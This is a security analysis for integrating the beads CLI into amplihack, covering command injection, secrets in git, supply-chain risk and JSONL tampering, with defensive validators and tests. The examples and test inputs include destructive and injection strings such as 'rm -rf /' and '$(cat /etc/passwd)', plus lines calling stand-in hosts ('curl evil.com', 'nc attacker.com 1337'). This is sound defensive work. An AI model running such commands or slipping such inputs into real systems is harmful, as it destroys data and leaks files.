# Beads Integration Security Analysis

**Project**: amplihack
**Component**: Beads Memory System Integration
**Date**: 2025-10-18
**Status**: Security Review - Pre-Implementation
**Risk Level**: MEDIUM-HIGH (External tool, git-distributed state, alpha software)

## Executive Summary

This document provides a comprehensive security analysis for integrating the beads memory system into amplihack. Beads is an external Go CLI tool (`bd`) that stores agent memory as JSONL files in git with local SQLite caching. This analysis identifies critical security risks and provides mitigation strategies while maintaining all user-required functionality.

**Key Findings:**

- HIGH RISK: Command injection vulnerabilities in subprocess execution
- MEDIUM RISK: Sensitive data exposure in git-committed JSONL files
- MEDIUM RISK: Alpha software stability and data loss bugs
- MEDIUM RISK: Supply chain trust for external Go binary
- LOW RISK: SQLite cache security (gitignored, local-only)

## 1. Command Injection Risks (HIGH RISK)

### Threat Description

The beads integration requires executing the external `bd` CLI via subprocess with user-supplied data (issue titles, descriptions, labels, assignees). This creates multiple injection points where malicious input could execute arbitrary commands.

### Attack Vectors

#### Vector 1.1: Shell Injection via Issue Title

```python
# VULNERABLE PATTERN
import subprocess

title = "Fix bug; rm -rf /"  # Malicious input
subprocess.run(f"bd create '{title}'", shell=True)
# Result: Executes both bd create AND rm -rf /
```

#### Vector 1.2: Argument Injection via Labels

```python
# VULNERABLE PATTERN
labels = "--db=/etc/passwd security"
subprocess.run(f"bd create 'title' --labels {labels}", shell=True)
# Result: Overwrites database path, potential data corruption
```

#### Vector 1.3: JSON Injection via Description

```python
# VULNERABLE PATTERN
description = '"; DROP TABLE issues; --'
subprocess.run(['bd', 'create', title, '-d', description], shell=False)
# Result: If bd uses SQL internally, potential SQL injection
```

### Risk Assessment

| Risk Factor    | Level    | Justification                                |
| -------------- | -------- | -------------------------------------------- |
| Likelihood     | HIGH     | User and agent input is frequently untrusted |
| Impact         | CRITICAL | Remote code execution, data destruction      |
| Exploitability | MEDIUM   | Requires understanding of command structure  |
| Overall Risk   | **HIGH** | Immediate mitigation required                |

### Mitigation Strategy

#### M1.1: Never Use shell=True

```python
# SECURE PATTERN
import subprocess
import shlex

def safe_bd_command(args: list[str]) -> subprocess.CompletedProcess:
    """Execute bd command safely without shell."""
    # Always use list form, never shell=True
    cmd = ['bd'] + args
    return subprocess.run(
        cmd,
        shell=False,  # CRITICAL: Never enable shell
        capture_output=True,
        text=True,
        timeout=30,  # Prevent DoS
        check=False  # Handle errors explicitly
    )

# Usage
result = safe_bd_command(['create', title, '-d', description])
```

#### M1.2: Input Sanitization

```python
import re
from typing import Optional

class BeadsInputValidator:
    """Validate and sanitize beads command inputs."""

    # Whitelist patterns for each field type
    TITLE_PATTERN = re.compile(r'^[a-zA-Z0-9\s\-_.,!?()\[\]]+$')
    LABEL_PATTERN = re.compile(r'^[a-zA-Z0-9\-_]+$')
    ID_PATTERN = re.compile(r'^[a-zA-Z0-9\-]+$')

    # Maximum lengths to prevent buffer overflow
    MAX_TITLE_LENGTH = 200
    MAX_DESCRIPTION_LENGTH = 10000
    MAX_LABEL_LENGTH = 50

    @classmethod
    def sanitize_title(cls, title: str) -> str:
        """Sanitize issue title."""
        # Truncate
        title = title[:cls.MAX_TITLE_LENGTH]

        # Validate characters
        if not cls.TITLE_PATTERN.match(title):
            raise ValueError(f"Invalid characters in title: {title}")

        # Remove control characters
        title = ''.join(char for char in title if ord(char) >= 32)

        return title.strip()

    @classmethod
    def sanitize_description(cls, description: str) -> str:
        """Sanitize issue description."""
        # Truncate
        description = description[:cls.MAX_DESCRIPTION_LENGTH]

        # Remove null bytes and control chars (except newlines/tabs)
        description = ''.join(
            char for char in description
            if char in '\n\t' or ord(char) >= 32
        )

        return description.strip()

    @classmethod
    def sanitize_label(cls, label: str) -> str:
        """Sanitize single label."""
        label = label[:cls.MAX_LABEL_LENGTH]

        if not cls.LABEL_PATTERN.match(label):
            raise ValueError(f"Invalid label format: {label}")

        return label

    @classmethod
    def sanitize_labels(cls, labels: list[str]) -> list[str]:
        """Sanitize list of labels."""
        return [cls.sanitize_label(l) for l in labels[:10]]  # Max 10 labels

    @classmethod
    def sanitize_issue_id(cls, issue_id: str) -> str:
        """Sanitize issue ID."""
        if not cls.ID_PATTERN.match(issue_id):
            raise ValueError(f"Invalid issue ID format: {issue_id}")
        return issue_id
```

#### M1.3: Parameterized Command Builder

```python
from typing import Optional, List
from dataclasses import dataclass

@dataclass
class BeadsCommand:
    """Type-safe beads command builder."""

    command: str  # create, update, close, etc.
    issue_id: Optional[str] = None
    title: Optional[str] = None
    description: Optional[str] = None
    labels: Optional[List[str]] = None
    priority: Optional[int] = None
    status: Optional[str] = None
    output_json: bool = False

    def build(self) -> list[str]:
        """Build command arguments list safely."""
        args = [self.command]

        # Validate and add issue ID
        if self.issue_id:
            args.append(BeadsInputValidator.sanitize_issue_id(self.issue_id))

        # Validate and add title
        if self.title:
            args.append(BeadsInputValidator.sanitize_title(self.title))

        # Add optional parameters
        if self.description:
            args.extend(['-d', BeadsInputValidator.sanitize_description(self.description)])

        if self.labels:
            sanitized = BeadsInputValidator.sanitize_labels(self.labels)
            args.extend(['--labels', ','.join(sanitized)])

        if self.priority is not None:
            if not 0 <= self.priority <= 4:
                raise ValueError(f"Invalid priority: {self.priority}")
            args.extend(['--priority', str(self.priority)])

        if self.status:
            # Whitelist valid statuses
            valid_statuses = ['open', 'in_progress', 'blocked', 'closed']
            if self.status not in valid_statuses:
                raise ValueError(f"Invalid status: {self.status}")
            args.extend(['--status', self.status])

        if self.output_json:
            args.append('--json')

        return args

# Usage example
def create_beads_issue(title: str, description: str) -> dict:
    """Create beads issue safely."""
    cmd = BeadsCommand(
        command='create',
        title=title,
        description=description,
        output_json=True
    )

    result = safe_bd_command(cmd.build())

    if result.returncode != 0:
        raise RuntimeError(f"bd command failed: {result.stderr}")

    return json.loads(result.stdout)
```

### Security Test Cases

```python
import pytest

def test_command_injection_prevention():
    """Test that shell injection is prevented."""
    # Malicious inputs
    malicious_titles = [
        "Test; rm -rf /",
        "Test`whoami`",
        "Test$(cat /etc/passwd)",
        "Test && curl evil.com",
        "Test | nc attacker.com 1337",
    ]

    for title in malicious_titles:
        with pytest.raises(ValueError):
            BeadsInputValidator.sanitize_title(title)

def test_argument_injection_prevention():
    """Test that argument injection is prevented."""
    malicious_labels = [
        "--db=/etc/passwd",
        "../../../etc/passwd",
        "--json; rm -rf /",
    ]

    for label in malicious_labels:
        with pytest.raises(ValueError):
            BeadsInputValidator.sanitize_label(label)

def test_subprocess_never_uses_shell():
    """Ensure subprocess calls never use shell=True."""
    # Static analysis test - check all subprocess calls
    import ast
    import inspect

    # Parse source code
    source = inspect.getsource(safe_bd_command)
    tree = ast.parse(source)

    # Find subprocess.run calls
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            if hasattr(node.func, 'attr') and node.func.attr == 'run':
                # Check for shell=True
                for keyword in node.keywords:
                    if keyword.arg == 'shell':
                        assert keyword.value.value is False, "Found shell=True!"
```

---

## 2. Data Security Risks (MEDIUM RISK)

### Threat Description

Beads stores all agent memory in `.beads/issues.jsonl` which is committed to git. This creates permanent, distributed storage of potentially sensitive information that cannot be easily retracted.

### Attack Vectors

#### Vector 2.1: Sensitive Data Committed to Git

```python
# DANGEROUS: Agent stores API key in issue
manager.create_issue(
    title="Fix authentication",
    description="API key is sk-1234567890abcdef, need to rotate it"
)
# Result: API key now in git history forever
```

#### Vector 2.2: Internal Architecture Exposure

```python
# RISK: Detailed system internals in git
manager.create_issue(
    title="Database credentials",
    description="""
    Production DB: postgres://admin:password@db.internal.company.com:5432  # pragma: allowlist secret
    Redis: redis://cache.internal.company.com:6379
    S3 bucket: s3://company-secrets-prod
    """
)
# Result: Attack surface documented in git
```

#### Vector 2.3: PII/User Data Leakage

```python
# RISK: Personal information in issue tracking
manager.create_issue(
    title="User bug report",
    description="User john.doe@company.com (SSN: 123-45-6789) reported crash"
)
# Result: GDPR/privacy violation in git history
```

### Risk Assessment

| Risk Factor    | Level      | Justification                                              |
| -------------- | ---------- | ---------------------------------------------------------- |
| Likelihood     | MEDIUM     | Agents may inadvertently include sensitive data            |
| Impact         | HIGH       | Credential exposure, privacy violations, compliance issues |
| Exploitability | LOW        | Requires git repository access                             |
| Overall Risk   | **MEDIUM** | Requires strict data classification                        |

### Mitigation Strategy

#### M2.1: Data Classification and Content Filtering

```python
import re
from typing import Tuple, List

class SensitiveDataDetector:
    """Detect and prevent sensitive data in beads issues."""

    # Pattern definitions
    PATTERNS = {
        'api_key': re.compile(r'["\']?(?:api[_-]?key|apikey)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{20,})["\']?', re.IGNORECASE),
        'aws_key': re.compile(r'AKIA[0-9A-Z]{16}'),
        'private_key': re.compile(r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----'),
        'password': re.compile(r'["\']?(?:password|passwd|pwd)["\']?\s*[:=]\s*["\']?([^\s"\']+)["\']?', re.IGNORECASE),
        'secret': re.compile(r'["\']?secret["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{20,})["\']?', re.IGNORECASE),
        'token': re.compile(r'["\']?(?:token|bearer)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-\.]{20,})["\']?', re.IGNORECASE),
        'ssn': re.compile(r'\b\d{3}-\d{2}-\d{4}\b'),
        'credit_card': re.compile(r'\b(?:\d{4}[- ]?){3}\d{4}\b'),
        'email_with_context': re.compile(r'(?:email|user|customer).*?([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', re.IGNORECASE),
        'ip_private': re.compile(r'\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2[0-9]|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b'),
        'connection_string': re.compile(r'(?:postgres|mysql|mongodb|redis)://[^\s]+', re.IGNORECASE),
    }

    @classmethod
    def scan(cls, text: str) -> Tuple[bool, List[str]]:
        """
        Scan text for sensitive data patterns.

        Returns:
            (has_sensitive_data, list_of_findings)
        """
        findings = []

        for pattern_name, pattern in cls.PATTERNS.items():
            matches = pattern.finditer(text)
            for match in matches:
                findings.append(f"{pattern_name}: {match.group(0)[:50]}...")

        return len(findings) > 0, findings

    @classmethod
    def sanitize_or_reject(cls, text: str, strict: bool = True) -> str:
        """
        Sanitize text or reject if sensitive data found.

        Args:
            text: Input text to check
            strict: If True, raise error on sensitive data. If False, redact.

        Returns:
            Sanitized text

        Raises:
            ValueError: If strict=True and sensitive data found
        """
        has_sensitive, findings = cls.scan(text)

        if has_sensitive:
            if strict:
                raise ValueError(
                    f"Sensitive data detected in beads issue content. "
                    f"Cannot commit to git. Findings: {findings}"
                )
            else:
                # Redact sensitive patterns
                sanitized = text
                for pattern in cls.PATTERNS.values():
                    sanitized = pattern.sub('[REDACTED]', sanitized)
                return sanitized

        return text
```

#### M2.2: Content Policy and Guidelines

```python
from typing import Dict, Any
from enum import Enum

class ContentSensitivity(Enum):
    """Content sensitivity levels for beads issues."""

    PUBLIC = "public"  # Safe for git, shareable
    INTERNAL = "internal"  # Project-specific, no secrets
    CONFIDENTIAL = "confidential"  # Should NOT go in beads
    RESTRICTED = "restricted"  # Absolutely forbidden

class BeadsContentPolicy:
    """Enforce content policy for beads issues."""

    # Define what content is allowed
    ALLOWED_CONTENT = {
        ContentSensitivity.PUBLIC: [
            "Bug descriptions (technical)",
            "Feature requests",
            "Architecture decisions",
            "Code patterns",
            "Test plans",
            "Documentation tasks",
        ],
        ContentSensitivity.INTERNAL: [
            "File paths (within project)",
            "Function names",
            "Module references",
            "Non-sensitive error messages",
        ],
    }

    # Define what content is forbidden
    FORBIDDEN_CONTENT = {
        ContentSensitivity.CONFIDENTIAL: [
            "Passwords, API keys, tokens",
            "Private keys, certificates",
            "Database credentials",
            "Internal URLs with credentials",
        ],
        ContentSensitivity.RESTRICTED: [
            "Customer PII (emails, SSNs, etc.)",
            "Financial data",
            "Health information (HIPAA)",
            "Authentication secrets",
        ],
    }

    @staticmethod
    def create_safe_issue_content(
        title: str,
        description: str,
        metadata: Dict[str, Any]
    ) -> Tuple[str, str]:
        """
        Create safe issue content with automatic sanitization.

        Returns:
            (sanitized_title, sanitized_description)
        """
        # Check for sensitive data
        title_has_sensitive, title_findings = SensitiveDataDetector.scan(title)
        desc_has_sensitive, desc_findings = SensitiveDataDetector.scan(description)

        if title_has_sensitive or desc_has_sensitive:
            raise ValueError(
                f"Cannot create beads issue with sensitive data. "
                f"Beads stores data in git - use ephemeral memory for secrets. "
                f"Title findings: {title_findings}, Description findings: {desc_findings}"
            )

        # Additional sanitization
        safe_title = BeadsInputValidator.sanitize_title(title)
        safe_description = BeadsInputValidator.sanitize_description(description)

        return safe_title, safe_description
```

#### M2.3: User Documentation and Warnings

```markdown
# Beads Security Guidelines for amplihack

## CRITICAL: What NOT to Store in Beads

Beads stores ALL data in `.beads/issues.jsonl` which is **committed to git**.
Once data is in git, it's effectively permanent and distributed.

### NEVER Store in Beads:

- Passwords, API keys, tokens, secrets
- Private keys, certificates, credentials
- Database connection strings with passwords
- Customer PII (emails, SSNs, phone numbers)
- Financial data, payment information
- Internal URLs with embedded credentials
- Session tokens, authentication cookies

### Safe to Store in Beads:

- Bug descriptions (technical details only)
- Feature requests and requirements
- Architecture decisions and patterns
- Code structure and design notes
- Test plans and quality gates
- Non-sensitive error messages

### Use Alternative Storage For:

- **Secrets**: Use environment variables, vaults, or `.env` files (gitignored)
- **Temporary data**: Use SQLite memory system (gitignored)
- **Sensitive logs**: Use `.claude/runtime/logs/` (gitignored)
- **User data**: Use proper databases, not git

## Git Considerations

- `.beads/issues.jsonl` is version-controlled
- All team members can see issue history
- Removing sensitive data from git history is difficult
- Assume issues are public within your organization
```

### Security Test Cases

```python
def test_sensitive_data_detection():
    """Test that sensitive data is detected."""
    test_cases = [
        ("API key: sk-1234567890abcdef", True),
        ("Password: mySecretPass123", True),
        ("SSN: 123-45-6789", True),
        ("Regular bug description", False),
        ("Error in function foo()", False),
    ]

    for text, should_detect in test_cases:
        has_sensitive, _ = SensitiveDataDetector.scan(text)
        assert has_sensitive == should_detect, f"Failed for: {text}"

def test_issue_creation_rejects_secrets():
    """Test that issue creation rejects sensitive data."""
    with pytest.raises(ValueError, match="Sensitive data detected"):
        BeadsContentPolicy.create_safe_issue_content(
            title="Fix auth",
            description="API key is sk-1234567890abcdef",
            metadata={}
        )
```

---

## 3. External Tool Trust and Supply Chain Risks (MEDIUM RISK)

### Threat Description

Beads is an external Go binary (`bd`) developed by a third party. This introduces supply chain risks including binary verification, update security, and dependency on external maintainers.

### Attack Vectors

#### Vector 3.1: Compromised Binary

- Attacker compromises beads GitHub repo
- Malicious binary distributed via `go install` or brew
- Binary includes backdoor or data exfiltration

#### Vector 3.2: Dependency Vulnerabilities

- Beads depends on vulnerable Go libraries
- Vulnerabilities in git integration code
- Unpatched security issues in alpha releases

#### Vector 3.3: Update Hijacking

- Man-in-the-middle during `go install`
- Compromised brew tap
- No binary signature verification

### Risk Assessment

| Risk Factor    | Level      | Justification                                 |
| -------------- | ---------- | --------------------------------------------- |
| Likelihood     | LOW        | Well-known author, open source, reviewable    |
| Impact         | HIGH       | Binary has filesystem and git access          |
| Exploitability | LOW        | Requires compromising external infrastructure |
| Overall Risk   | **MEDIUM** | Manageable with verification                  |

### Mitigation Strategy

#### M3.1: Binary Verification

```python
import hashlib
import subprocess
from pathlib import Path
from typing import Optional

class BeadsBinaryVerifier:
    """Verify beads binary integrity and version."""

    # Known good checksums for specific versions
    KNOWN_CHECKSUMS = {
        "0.9.3": {
            "darwin_amd64": "sha256:abc123...",
            "darwin_arm64": "sha256:def456...",
            "linux_amd64": "sha256:ghi789...",
        }
    }

    MIN_VERSION = "0.9.3"
    MAX_VERSION = "1.0.0"  # Don't auto-upgrade beyond this

    @staticmethod
    def find_bd_binary() -> Optional[Path]:
        """Locate bd binary in PATH."""
        result = subprocess.run(
            ['which', 'bd'],
            capture_output=True,
            text=True,
            check=False
        )

        if result.returncode == 0:
            return Path(result.stdout.strip())
        return None

    @staticmethod
    def get_version() -> Optional[str]:
        """Get bd binary version."""
        try:
            result = subprocess.run(
                ['bd', 'version'],
                capture_output=True,
                text=True,
                timeout=5,
                check=False
            )

            if result.returncode == 0:
                # Parse version from output
                import re
                match = re.search(r'(\d+\.\d+\.\d+)', result.stdout)
                if match:
                    return match.group(1)
        except Exception:
            pass

        return None

    @staticmethod
    def verify_version_compatibility(version: str) -> bool:
        """Check if version is compatible."""
        from packaging import version as pkg_version

        try:
            v = pkg_version.parse(version)
            min_v = pkg_version.parse(BeadsBinaryVerifier.MIN_VERSION)
            max_v = pkg_version.parse(BeadsBinaryVerifier.MAX_VERSION)

            return min_v <= v < max_v
        except Exception:
            return False

    @staticmethod
    def compute_checksum(binary_path: Path) -> str:
        """Compute SHA256 checksum of binary."""
        sha256 = hashlib.sha256()

        with open(binary_path, 'rb') as f:
            while chunk := f.read(8192):
                sha256.update(chunk)

        return f"sha256:{sha256.hexdigest()}"

    @classmethod
    def verify_binary(cls) -> Tuple[bool, str]:
        """
        Verify beads binary is safe to use.

        Returns:
            (is_safe, message)
        """
        # Find binary
        bd_path = cls.find_bd_binary()
        if not bd_path:
            return False, "bd binary not found in PATH"

        # Check version
        version = cls.get_version()
        if not version:
            return False, "Could not determine bd version"

        if not cls.verify_version_compatibility(version):
            return False, f"Incompatible bd version: {version} (need {cls.MIN_VERSION} <= v < {cls.MAX_VERSION})"

        # Compute checksum
        checksum = cls.compute_checksum(bd_path)

        # Verify checksum if known
        platform_key = f"{subprocess.check_output(['uname', '-s']).decode().strip().lower()}_{subprocess.check_output(['uname', '-m']).decode().strip()}"

        if version in cls.KNOWN_CHECKSUMS:
            expected = cls.KNOWN_CHECKSUMS[version].get(platform_key)
            if expected and checksum != expected:
                return False, f"Checksum mismatch! Expected {expected}, got {checksum}"

        return True, f"bd v{version} verified: {bd_path}"
```

#### M3.2: Installation Security

```python
class BeadsInstaller:
    """Secure beads installation management."""

    @staticmethod
    def check_prerequisites() -> Tuple[bool, List[str]]:
        """Check if system has required tools."""
        issues = []

        # Check Go version
        try:
            result = subprocess.run(
                ['go', 'version'],
                capture_output=True,
                text=True,
                timeout=5,
                check=False
            )

            if result.returncode != 0:
                issues.append("Go is not installed (required for `go install`)")
            else:
                # Parse version
                import re
                match = re.search(r'go(\d+\.\d+)', result.stdout)
                if match:
                    version = float(match.group(1))
                    if version < 1.23:
                        issues.append(f"Go version {version} too old (need 1.23+)")
        except FileNotFoundError:
            issues.append("Go is not installed")

        return len(issues) == 0, issues

    @staticmethod
    def install_from_source(verify_checksum: bool = True) -> bool:
        """
        Install beads from source with verification.

        Args:
            verify_checksum: Verify binary checksum after build

        Returns:
            True if successful
        """
        print("Installing beads from source (most secure method)...")

        # Clone repo
        temp_dir = Path("/tmp/beads_install")
        if temp_dir.exists():
            import shutil
            shutil.rmtree(temp_dir)

        # Clone with specific tag (don't trust HEAD)
        version = BeadsBinaryVerifier.MIN_VERSION
        result = subprocess.run(
            [
                'git', 'clone',
                '--depth', '1',
                '--branch', f'v{version}',
                'https://github.com/steveyegge/beads.git',
                str(temp_dir)
            ],
            capture_output=True,
            text=True,
            timeout=60,
            check=False
        )

        if result.returncode != 0:
            print(f"Failed to clone beads repo: {result.stderr}")
            return False

        # Build from source
        result = subprocess.run(
            ['go', 'build', '-o', str(Path.home() / 'go/bin/bd'), './cmd/bd'],
            cwd=temp_dir,
            capture_output=True,
            text=True,
            timeout=300,
            check=False
        )

        if result.returncode != 0:
            print(f"Failed to build beads: {result.stderr}")
            return False

        # Verify installation
        is_safe, message = BeadsBinaryVerifier.verify_binary()
        print(message)

        return is_safe
```

#### M3.3: Runtime Monitoring

```python
import logging
from datetime import datetime, timedelta
from typing import Dict

class BeadsMonitor:
    """Monitor beads operations for anomalies."""

    def __init__(self):
        self.operation_count: Dict[str, int] = {}
        self.last_check = datetime.now()
        self.logger = logging.getLogger('beads.monitor')

    def record_operation(self, operation: str):
        """Record beads operation."""
        self.operation_count[operation] = self.operation_count.get(operation, 0) + 1

        # Alert on suspicious patterns
        if self.operation_count[operation] > 100:
            self.logger.warning(
                f"High frequency of '{operation}' operations: {self.operation_count[operation]}"
            )

    def check_anomalies(self):
        """Check for anomalous behavior."""
        now = datetime.now()

        # Check rate limits
        if now - self.last_check < timedelta(minutes=1):
            total_ops = sum(self.operation_count.values())
            if total_ops > 1000:
                self.logger.error(
                    f"Abnormally high operation count: {total_ops} in 1 minute"
                )
                # Potential DoS or runaway agent
                raise RuntimeError("Beads operation rate limit exceeded")

        self.last_check = now
```

### Security Test Cases

```python
def test_binary_verification():
    """Test binary verification process."""
    is_safe, message = BeadsBinaryVerifier.verify_binary()
    assert is_safe, f"Binary verification failed: {message}"

def test_version_compatibility():
    """Test version compatibility checks."""
    assert BeadsBinaryVerifier.verify_version_compatibility("0.9.3") is True
    assert BeadsBinaryVerifier.verify_version_compatibility("0.8.0") is False
    assert BeadsBinaryVerifier.verify_version_compatibility("2.0.0") is False
```

---

## 4. Git Security and JSONL File Tampering (MEDIUM RISK)

### Threat Description

The `.beads/issues.jsonl` file is the source of truth stored in git. Malicious actors with git access could tamper with issue data, inject malicious content, or cause data corruption through carefully crafted merge conflicts.

### Attack Vectors

#### Vector 4.1: Direct JSONL Manipulation

```bash
# Attacker with git access
cd .beads
echo '{"id":"malicious","status":"closed","title":"backdoor"}' >> issues.jsonl
git add issues.jsonl
git commit -m "Update issue"
git push
```

#### Vector 4.2: Merge Conflict Exploitation

```bash
# Attacker creates conflicting changes
# Branch A: Adds legitimate issue
# Branch B: Adds malicious issue with same ID
# Merge conflict may result in corrupted JSONL
```

#### Vector 4.3: History Rewriting

```bash
# Attacker rewrites history to remove audit trail
git filter-branch --tree-filter 'sed -i "/sensitive/d" .beads/issues.jsonl' HEAD
```

### Risk Assessment

| Risk Factor    | Level      | Justification                     |
| -------------- | ---------- | --------------------------------- |
| Likelihood     | LOW        | Requires git write access         |
| Impact         | MEDIUM     | Data corruption, audit trail loss |
| Exploitability | MEDIUM     | Standard git operations           |
| Overall Risk   | **MEDIUM** | Mitigated by access controls      |

### Mitigation Strategy

#### M4.1: JSONL Integrity Validation

```python
import json
from typing import List, Tuple
from pathlib import Path

class JSONLValidator:
    """Validate JSONL file integrity."""

    REQUIRED_FIELDS = {'id', 'title', 'status', 'created_at'}
    VALID_STATUSES = {'open', 'in_progress', 'blocked', 'closed'}

    @classmethod
    def validate_file(cls, jsonl_path: Path) -> Tuple[bool, List[str]]:
        """
        Validate JSONL file integrity.

        Returns:
            (is_valid, list_of_errors)
        """
        errors = []
        seen_ids = set()
        line_num = 0

        try:
            with open(jsonl_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line_num += 1
                    line = line.strip()

                    if not line:
                        continue

                    # Parse JSON
                    try:
                        issue = json.loads(line)
                    except json.JSONDecodeError as e:
                        errors.append(f"Line {line_num}: Invalid JSON - {e}")
                        continue

                    # Validate required fields
                    missing = cls.REQUIRED_FIELDS - set(issue.keys())
                    if missing:
                        errors.append(f"Line {line_num}: Missing fields {missing}")

                    # Validate ID uniqueness
                    issue_id = issue.get('id')
                    if issue_id in seen_ids:
                        errors.append(f"Line {line_num}: Duplicate ID {issue_id}")
                    seen_ids.add(issue_id)

                    # Validate status
                    status = issue.get('status')
                    if status not in cls.VALID_STATUSES:
                        errors.append(f"Line {line_num}: Invalid status '{status}'")

                    # Validate data types
                    if not isinstance(issue.get('title'), str):
                        errors.append(f"Line {line_num}: title must be string")

        except FileNotFoundError:
            errors.append(f"File not found: {jsonl_path}")
        except Exception as e:
            errors.append(f"Unexpected error: {e}")

        return len(errors) == 0, errors

    @classmethod
    def repair_if_possible(cls, jsonl_path: Path, backup: bool = True) -> bool:
        """
        Attempt to repair corrupted JSONL file.

        Args:
            jsonl_path: Path to JSONL file
            backup: Create backup before repair

        Returns:
            True if repaired successfully
        """
        if backup:
            import shutil
            backup_path = jsonl_path.with_suffix('.jsonl.bak')
            shutil.copy2(jsonl_path, backup_path)
            print(f"Backup created: {backup_path}")

        valid_lines = []
        seen_ids = set()

        with open(jsonl_path, 'r', encoding='utf-8') as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                if not line:
                    continue

                try:
                    issue = json.loads(line)

                    # Skip duplicates
                    issue_id = issue.get('id')
                    if issue_id in seen_ids:
                        print(f"Skipping duplicate ID: {issue_id}")
                        continue

                    # Skip invalid entries
                    if not cls.REQUIRED_FIELDS.issubset(issue.keys()):
                        print(f"Skipping invalid entry at line {line_num}")
                        continue

                    seen_ids.add(issue_id)
                    valid_lines.append(line)

                except json.JSONDecodeError:
                    print(f"Skipping malformed JSON at line {line_num}")
                    continue

        # Write repaired file
        with open(jsonl_path, 'w', encoding='utf-8') as f:
            for line in valid_lines:
                f.write(line + '\n')

        print(f"Repaired: {len(valid_lines)} valid entries")
        return True
```

#### M4.2: Git Pre-Commit Hook

```python
#!/usr/bin/env python3
"""Pre-commit hook to validate beads JSONL integrity."""

import sys
from pathlib import Path

def main():
    """Validate JSONL before commit."""
    jsonl_path = Path('.beads/issues.jsonl')

    if not jsonl_path.exists():
        # No beads file, skip validation
        return 0

    # Check if file is staged
    import subprocess
    result = subprocess.run(
        ['git', 'diff', '--cached', '--name-only'],
        capture_output=True,
        text=True,
        check=False
    )

    if '.beads/issues.jsonl' not in result.stdout:
        # Not modified, skip
        return 0

    print("Validating beads JSONL integrity...")

    is_valid, errors = JSONLValidator.validate_file(jsonl_path)

    if not is_valid:
        print("\nERROR: Invalid beads JSONL file!")
        print("Errors found:")
        for error in errors:
            print(f"  - {error}")
        print("\nCommit aborted. Fix issues or run: bd compact")
        return 1

    print("Beads JSONL validation passed")
    return 0

if __name__ == '__main__':
    sys.exit(main())
```

#### M4.3: Access Control and Audit Logging

```python
import logging
from datetime import datetime
from pathlib import Path
from typing import Optional

class BeadsAuditLogger:
    """Audit logger for beads operations."""

    def __init__(self, log_path: Optional[Path] = None):
        if log_path is None:
            log_path = Path.home() / '.amplihack' / 'beads_audit.log'

        log_path.parent.mkdir(parents=True, exist_ok=True)

        self.logger = logging.getLogger('beads.audit')
        self.logger.setLevel(logging.INFO)

        handler = logging.FileHandler(log_path)
        handler.setFormatter(
            logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        )
        self.logger.addHandler(handler)

    def log_operation(
        self,
        operation: str,
        issue_id: Optional[str] = None,
        agent_id: Optional[str] = None,
        metadata: Optional[dict] = None
    ):
        """Log beads operation for audit trail."""
        self.logger.info(
            f"operation={operation} issue_id={issue_id} agent_id={agent_id} metadata={metadata}"
        )

    def log_security_event(self, event_type: str, details: str):
        """Log security-relevant event."""
        self.logger.warning(f"SECURITY: {event_type} - {details}")
```

### Security Test Cases

```python
def test_jsonl_validation():
    """Test JSONL validation detects corruption."""
    # Create test file with various issues
    test_jsonl = Path('/tmp/test_issues.jsonl')

    with open(test_jsonl, 'w') as f:
        f.write('{"id":"1","title":"Valid","status":"open","created_at":"2025-01-01"}\n')
        f.write('{"id":"1","title":"Duplicate","status":"open","created_at":"2025-01-01"}\n')  # Duplicate
        f.write('invalid json\n')  # Invalid
        f.write('{"id":"3","title":"Missing status"}\n')  # Missing fields

    is_valid, errors = JSONLValidator.validate_file(test_jsonl)

    assert not is_valid
    assert len(errors) >= 3

def test_jsonl_repair():
    """Test JSONL repair functionality."""
    test_jsonl = Path('/tmp/test_issues.jsonl')

    # Create corrupted file
    with open(test_jsonl, 'w') as f:
        f.write('{"id":"1","title":"Valid","status":"open","created_at":"2025-01-01"}\n')
        f.write('invalid\n')
        f.write('{"id":"2","title":"Valid2","status":"open","created_at":"2025-01-01"}\n')

    # Repair
    JSONLValidator.repair_if_possible(test_jsonl, backup=True)

    # Validate repaired file
    is_valid, errors = JSONLValidator.validate_file(test_jsonl)
    assert is_valid
```

---

## 5. Process Security and Environment Handling (LOW RISK)

### Threat Description

The beads integration executes subprocess operations and interacts with the file system. Improper environment handling could expose sensitive data or allow privilege escalation.

### Attack Vectors

#### Vector 5.1: Environment Variable Leakage

```python
# VULNERABLE: Exposes all environment variables to subprocess
subprocess.run(['bd', 'create', title], env=os.environ)
# Risk: BD_API_KEY, AWS_SECRET_KEY visible to bd process
```

#### Vector 5.2: Path Traversal

```python
# VULNERABLE: User controls database path
db_path = user_input  # "../../../etc/passwd"
subprocess.run(['bd', 'create', title, '--db', db_path])
```

#### Vector 5.3: Working Directory Manipulation

```python
# VULNERABLE: Operates in arbitrary directory
os.chdir(user_provided_path)
subprocess.run(['bd', 'init'])
```

### Risk Assessment

| Risk Factor    | Level   | Justification                            |
| -------------- | ------- | ---------------------------------------- |
| Likelihood     | LOW     | Requires specific configuration mistakes |
| Impact         | MEDIUM  | File access, info disclosure             |
| Exploitability | MEDIUM  | Depends on application design            |
| Overall Risk   | **LOW** | Preventable with best practices          |

### Mitigation Strategy

#### M5.1: Environment Variable Isolation

```python
import os
from typing import Dict, Optional

class BeadsEnvironment:
    """Manage beads subprocess environment securely."""

    # Whitelist of safe environment variables
    SAFE_ENV_VARS = {
        'PATH',
        'HOME',
        'USER',
        'LANG',
        'LC_ALL',
        'TMPDIR',
    }

    @classmethod
    def get_safe_environment(cls) -> Dict[str, str]:
        """Create minimal safe environment for bd subprocess."""
        safe_env = {}

        for var in cls.SAFE_ENV_VARS:
            if var in os.environ:
                safe_env[var] = os.environ[var]

        # Set beads-specific variables if needed
        # safe_env['BEADS_CONFIG'] = str(Path.home() / '.beads_config')

        return safe_env

# Usage
result = subprocess.run(
    ['bd', 'create', title],
    env=BeadsEnvironment.get_safe_environment(),  # Isolated environment
    capture_output=True,
    text=True,
    timeout=30,
    check=False
)
```

